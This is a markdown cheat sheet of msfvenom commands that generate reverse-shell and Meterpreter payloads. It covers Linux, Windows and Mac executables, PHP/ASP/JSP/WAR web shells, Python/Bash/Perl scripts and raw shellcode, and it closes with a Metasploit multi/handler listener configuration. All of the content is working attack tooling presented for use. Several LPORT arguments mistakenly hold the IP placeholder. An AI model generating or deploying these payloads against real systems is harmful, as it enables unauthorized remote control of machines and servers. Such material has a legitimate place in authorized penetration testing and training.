## Binaries
#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[your_IP_address] LPORT=[your_port_to_connect] -f elf > shell.elf
```
#### Windows
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your_IP_address] LPORT=[your_port_to_connect] -f exe > shell.exe
```
#### Mac
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=[your_IP_address] LPORT=[your_port_to_connect] -f macho > shell.macho
```
## Web Payloads
#### PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=[your_IP_address] LPORT=[your_port_to_connect] -f raw > shell.php
```
#### ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your_IP_address] LPORT=[your_port_to_connect] -f asp > shell.asp
```
#### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[your_IP_address] LPORT=[your_port_to_connect] -f raw > shell.jsp
```
#### WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[your_IP_address] LPORT=[your_port_to_connect] -f war > shell.war

## Script Payloads
#### python
```
msfvenom -p cmd/unix/reverse_python LHOST=[your_IP_address] LPORT=[your_IP_address] -f raw > shell.py
```
#### Bash
```
msfvenom -p cmd/unix/reverse_bash LHOST=[your_IP_address] LPORT=[your_IP_address] -f raw > shell.sh
```
#### Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=[your_IP_address] LPORT=[your_IP_address] -f raw > shell.pl
```
## Shellcode
#### Linux Based Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[your_IP_address] LPORT=[your_IP_address] -f [language]
```
#### Windows Based Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your_IP_address] LPORT=[your_IP_address]  -f [language]
```
#### Mac Based Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=[your_IP_address] LPORT=[your_IP_address] -f [language]
```

## Handlers
```
use exploit/multi/handler
set PAYLOAD [Payload name]
set LHOST [LHOST value]
set LPORT [LPORT value]
set ExitOnSession false
exploit -j -z
```
